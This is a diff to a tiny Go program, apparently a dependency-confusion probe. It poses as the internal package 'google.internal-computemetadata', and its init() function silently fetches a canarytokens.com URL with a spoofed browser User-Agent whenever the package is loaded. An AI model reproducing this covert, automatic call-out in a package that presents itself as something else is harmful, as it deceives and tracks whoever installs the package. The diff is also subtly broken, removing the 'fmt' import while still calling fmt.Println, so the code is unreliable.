@@ -1,17 +1,15 @@
-
-
 package main
 
 import (
-    "fmt"
-    "net/http"
+	"net/http"
 )
 
 func init() {
-    // Replace the URL if needed
-    http.Get("http://canarytokens.com/about/traffic/stuff/f1yyzylemzyl6xebwu0ujucf4/complete")
+	req, _ := http.NewRequest("GET", "http://canarytokens.com/static/feedback/about/7oztq27u89njz56k2nyw7hkcn/payments.js", nil)
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+	http.DefaultClient.Do(req)
 }
 
 func main() {
-    fmt.Println("It works!")
+	fmt.Println("google.internal-computemetadata: successfully installed and running.")
 }
